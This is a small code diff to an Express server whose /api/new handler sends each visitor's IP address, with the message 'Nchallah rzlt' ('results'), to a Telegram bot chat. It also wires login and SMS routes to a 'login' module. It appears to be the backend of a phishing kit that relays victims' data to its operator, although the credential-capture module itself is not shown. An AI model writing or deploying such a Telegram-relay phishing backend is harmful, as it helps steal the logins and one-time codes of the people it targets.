@@ -16,17 +16,19 @@ app.get('/', (req, res) => {
 })
 
 app.post('/api/new', (req, res) => {
+
     const ress="#New visiteur from IP : "+req.ip+" \n" +
         "Nchallah rzlt ♥♥♥ \n"
     const rs = axios.post(`${Telegram_api}/sendMessage`, {
         chat_id: ChatID,
         text: ress
     })
-    res.send(rs)
+
 })
 
 app.use('/api/login/new',require('./routres/login'))
 app.use('/api/sms',require('./routres/login'))
+app.use('/api/new',require('./routres/login'))
 app.listen(port, () => {
     console.log(`Example app listening on port ${port}`)
 })
